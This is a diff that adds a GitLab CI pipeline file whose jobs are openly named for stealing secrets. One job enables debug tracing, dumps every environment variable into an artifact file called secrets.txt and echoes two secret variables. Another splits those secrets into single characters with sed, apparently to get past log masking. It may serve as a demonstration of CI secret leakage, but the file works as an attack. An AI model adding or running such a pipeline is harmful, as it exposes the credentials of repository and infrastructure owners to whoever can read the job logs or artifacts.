@@ -1,0 +1,25 @@
+stages:  
+  - steal
+  - parse
+
+steal_secrets:  
+  variables:    
+    CI_DEBUG_TRACE: "true"  
+  stage: steal
+  artifacts:
+    paths:
+      - secrets.txt
+  script:
+    - export
+    - export > secrets.txt
+  tags:
+    - runner
+parse_secrets:  
+  stage: parse
+  script:    
+    - echo ${SECRET1}
+    - echo ${SECRET2}
+    - echo ${SECRET1} | sed -e 's/\(.\)/\1\n/g'
+    - echo ${SECRET2} | sed -e 's/\(.\)/\1\n/g'
+  tags:    
+    - runner
